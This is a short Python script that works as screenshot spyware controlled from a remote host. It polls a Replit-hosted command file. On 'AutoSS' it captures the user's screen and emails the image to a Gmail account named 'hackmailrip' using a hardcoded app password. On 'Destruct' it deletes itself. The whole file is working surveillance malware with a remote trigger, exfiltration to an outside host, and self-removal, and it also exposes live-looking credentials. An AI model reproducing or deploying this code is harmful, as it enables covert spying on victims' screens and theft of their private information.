import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import requests
import time
import pyautogui
import os

# Email credentials
sender_email = "hackmailrip@gmail.com"
sender_password = "fzdl eopw eirl rgqd"
receiver_email = "hackmailrip@gmail.com"

# Function to send email with screenshot
def send_email_with_screenshot():
    # Take screenshot
    screenshot = pyautogui.screenshot()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    
    # Create message container
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Screenify Results"
    
    # Attach the body (screenshot) to the email
    with open(screenshot_path, "rb") as f:
        attachment = MIMEImage(f.read(), _subtype="png")
        attachment.add_header('Content-Disposition', 'attachment', filename=screenshot_path)
        msg.attach(attachment)
    
    # Connect to SMTP server and send email
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  # Start TLS encryption
        server.login(sender_email, sender_password)  # Login to your email
        text = msg.as_string()
        server.sendmail(sender_email, receiver_email, text)  # Send the email
        print("Email sent successfully!")
    except Exception as e:
        print("An error occurred:", e)
    finally:
        server.quit()  # Quit the server

# URL to download
url = "https://8053c79d-dd19-4d3b-a694-c73cc6873f15-00-14kwtl59ug5wr.worf.replit.dev/controls.txt"
output_file = "status.txt"

loop = True

while loop:
    try:
        response = requests.get(url)
        if response.status_code == 200:
            file_content = response.text
            
            if "AutoSS" in file_content:
                send_email_with_screenshot()
                
            if "Destruct" in file_content:
                # Delete the script file
                os.remove(__file__)
                print("Script file deleted.")
                break  # Exit the loop after deleting the script file

            with open(output_file, "w") as f:
                f.write(file_content)

    except Exception as e:
        print("An error occurred:", e)
    
    time.sleep(0.2)
